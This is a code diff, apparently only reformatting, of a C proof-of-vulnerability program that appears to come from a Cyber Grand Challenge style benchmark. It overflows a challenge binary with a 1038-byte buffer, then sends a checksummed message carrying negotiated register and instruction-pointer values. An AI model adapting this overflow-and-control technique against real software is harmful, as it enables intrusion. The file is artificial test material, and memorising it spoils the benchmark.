@@ -24,30 +24,26 @@ THE SOFTWARE.
 
 */
 
-
 #include <libpov.h>
 
 #define CMD_LEN 9
 
-typedef struct { 
-
-	unsigned short flag;
-	unsigned short length;
-	unsigned char command[CMD_LEN];
-	unsigned int checkvalue;
+typedef struct {
+  unsigned short flag;
+  unsigned short length;
+  unsigned char command[CMD_LEN];
+  unsigned int checkvalue;
 
 } programMessageType;
 
-
-#define TO_CB   1
+#define TO_CB 1
 #define FROM_CB 0
-
 
 int SendToCB(char *buf, int length) {
   int total_sent = 0;
   int ret;
   size_t bytes_sent = 0;
-  while(total_sent < length) {
+  while (total_sent < length) {
     ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
     if (ret != 0) {
       // error
@@ -66,7 +62,8 @@ int ReceiveFromCB(char *buf, int length) {
   size_t bytes_received = 0;
   int ret;
   while (total_received < length) {
-    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
+    ret = receive(FROM_CB, buf + total_received, length - total_received,
+                  &bytes_received);
     if (ret != 0) {
       return -1;
     }
@@ -78,51 +75,41 @@ int ReceiveFromCB(char *buf, int length) {
   return total_received;
 }
 
+int main(void) {
+  programMessageType theMessage;
+  int i;
+  unsigned int checkval;
+  size_t size;
 
-int main(void)
-{
-	programMessageType theMessage;
-	int i;
-	unsigned int checkval;
-	size_t size;
+  type1_vals t1vals;
+  type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);
 
-	type1_vals t1vals;
- 	type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);
+  // Construct normal message with payload addresses
+  theMessage.flag = 0x5aa5;
 
- 	// Construct normal message with payload addresses
-	theMessage.flag = 0x5aa5;
+  theMessage.length = CMD_LEN;
 
-	theMessage.length = CMD_LEN;
+  theMessage.command[0] = 0x11;
+  *(unsigned int *)&(theMessage.command[1]) = t1vals.regval;
+  *(unsigned int *)&(theMessage.command[5]) = t1vals.ipval;
 
-	theMessage.command[0] = 0x11;
-	*( unsigned int * )&(theMessage.command[1]) = t1vals.regval;
-	*( unsigned int * )&(theMessage.command[5]) = t1vals.ipval;
+  for (i = 0; i < sizeof(programMessageType) - 4; ++i)
+    checkval = checkval + *((unsigned char *)&theMessage + i) * (i + 1);
 
-	for (i=0; i < sizeof(programMessageType)-4; ++i)
-		checkval = checkval + *((unsigned char *)&theMessage+i)*(i+1);
+  theMessage.checkvalue = checkval;
 
-	theMessage.checkvalue = checkval;
+  // Construct overflow
+  const int len = 1038;
+  unsigned char bad_buff[len];
+  for (int x = 0; x < len; x++) {
+    bad_buff[x] = '\xa5';
+  }
 
-	// Construct overflow
-	const int len = 1038;
-	unsigned char bad_buff[len];
-	for( int x = 0; x < len; x++ )
-	{
-		bad_buff[x] = '\xa5';
-	}
+  // Send overflow
+  SendToCB((void *)bad_buff, len);
 
-	// Send overflow
-	SendToCB( (void*)bad_buff, len );
+  // Send message with payload
+  SendToCB((void *)&theMessage, sizeof(programMessageType));
 
-	// Send message with payload
-	SendToCB( (void *)&theMessage, sizeof(programMessageType) );
-
-	return 0;
+  return 0;
 }
-
-
-
-
-
-
-
